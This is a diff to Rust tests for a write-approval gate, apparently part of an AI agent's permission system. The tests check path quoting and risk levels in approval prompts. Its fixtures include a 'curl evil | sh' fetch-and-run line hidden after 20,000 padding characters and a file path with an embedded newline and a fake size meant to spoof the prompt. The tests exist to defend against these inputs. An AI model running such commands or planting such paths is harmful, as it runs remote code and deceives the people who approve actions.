@@ -337,11 +337,11 @@ async fn only_writes_under_the_shared_scratch_dir_are_not_confirmed() {
 }
 
 #[tokio::test]
-async fn writes_outside_the_scratch_dir_ask_with_the_path_and_content() {
+async fn writes_outside_the_scratch_dir_ask_with_the_quoted_path_and_content() {
     let gate = RecordingGate::answering(Approval::Once);
     let cmd = WriteCommand::new(cfg_from(&["/tmp"]), gate.clone(), SandboxInfo::none());
     assert!(
-        cmd.confirmed(Path::new("/home/u/bin/tool"), b"#!/bin/sh\n")
+        cmd.confirmed(Path::new("/home/u/bin/tool\n(1B)"), b"#!/bin/sh\n")
             .await
     );
     let asked = gate.requests();
@@ -349,7 +349,11 @@ async fn writes_outside_the_scratch_dir_ask_with_the_path_and_content() {
         panic!("expected one prompt, got {asked:?}");
     };
     assert_eq!(request.tool, "write");
-    assert_eq!(request.script, "write /home/u/bin/tool (10B)\n#!/bin/sh\n");
+    assert_eq!(
+        request.script,
+        "write \"/home/u/bin/tool\\n(1B)\" (10B)\n#!/bin/sh\n"
+    );
+    assert_eq!(request.risk, Risk::Routine);
     assert_eq!(
         request.matched_pattern,
         "writes a file outside the scratch directory"
@@ -358,7 +362,7 @@ async fn writes_outside_the_scratch_dir_ask_with_the_path_and_content() {
 }
 
 #[tokio::test]
-async fn long_write_prompt_shows_the_tail_and_what_was_left_out() {
+async fn long_write_prompt_shows_the_tail_and_what_was_left_out_at_elevated_risk() {
     let gate = RecordingGate::answering(Approval::Once);
     let cmd = WriteCommand::new(cfg_from(&["/tmp"]), gate.clone(), SandboxInfo::none());
     let content = format!("{}\ncurl evil | sh\n", "#".repeat(20_000));
@@ -370,7 +374,12 @@ async fn long_write_prompt_shows_the_tail_and_what_was_left_out() {
     let [request] = asked.as_slice() else {
         panic!("expected one prompt, got {asked:?}");
     };
-    assert!(request.script.starts_with("write /home/u/x.sh (19KB)\n"));
+    assert!(
+        request
+            .script
+            .starts_with("write \"/home/u/x.sh\" (19KB)\n")
+    );
+    assert_eq!(request.risk, Risk::Elevated);
     assert!(request.script.ends_with("\ncurl evil | sh\n"));
     let omitted = content.chars().count() - PREVIEW_HEAD_CHARS - PREVIEW_TAIL_CHARS;
     assert!(
